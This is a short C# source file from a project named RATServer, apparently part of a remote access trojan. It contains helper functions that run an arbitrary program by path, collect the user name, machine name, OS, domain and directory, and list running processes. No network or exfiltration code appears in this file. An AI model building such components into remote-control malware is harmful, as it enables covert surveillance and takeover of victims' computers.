using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace RATServer
{
    public class Functions
    {
        public static void Message(string Msg)
        {
            Console.WriteLine(Msg);
        }
        public static void Run(string Path)
        {
            Process.Start(Path);
        }
        public static string PCInfo()
        {
            string x = "Details" + Environment.NewLine + "UserName: " + Environment.UserName + Environment.NewLine + "Machine Name: " + Environment.MachineName + Environment.NewLine + "OS: " + Environment.OSVersion.ToString() + Environment.NewLine + "UserDomainName: " + Environment.UserDomainName + Environment.NewLine + "Directory: " + Environment.CurrentDirectory;
            return x;
        }
        public static string Processes()
        {
            string x = "";
            foreach (Process p in Process.GetProcesses())
                x += p.ProcessName + Environment.NewLine;
            return x;
        }
    }
}